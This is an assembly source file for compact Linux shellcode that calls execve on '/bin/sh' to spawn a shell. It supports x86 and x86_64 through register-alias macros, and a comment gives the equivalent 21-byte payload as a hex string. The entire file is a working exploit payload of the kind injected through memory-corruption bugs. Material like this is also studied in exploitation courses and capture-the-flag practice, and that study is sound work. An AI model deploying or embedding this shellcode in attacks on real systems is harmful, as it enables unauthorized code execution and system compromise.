# /* execve("/bin/sh", 0, 0) - 21 bytes */
# char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";

# Register aliases to make it both x86 and x86_64 compatible #
.if ARCH == 64
	.set SYS_EXECVE, 59
	.set EAX, %rax
	.set EBX, %rdi
	.set ECX, %rsi
	.set EDX, %rdx
	.set ESP, %rsp
	.macro _SYSCALL_
		syscall
	.endm
.else
	.set SYS_EXECVE, 11
	.set EAX, %eax
	.set EBX, %ebx
	.set ECX, %ecx
	.set EDX, %edx
	.set ESP, %esp
	.macro _SYSCALL_
		int $0x80
	.endm
.endif

.text
.globl _start
_start:
	push	$SYS_EXECVE	# sys_execve
	pop	EAX

	cdq
	push EDX		# null-terminator byte(s)

.if ARCH == 64
	movabs $0x68732f6e69622f2f, %rdi
	push %rdi		# '//bin/sh'
.else
	push $0x68732f6e	# 'n/sh'
	push $0x69622f2f	# '//bi'
.endif

	mov ESP, EBX		# "//bin/sh"

# Option 1: argv = NULL (2 bytes long) #
	mov	EDX, ECX
# Option 2: argv = ["/bin/sh", NULL] (4 bytes long) #
#	push	EDX
#	push	EBX
#	mov	ESP, ECX

	_SYSCALL_		# syscall
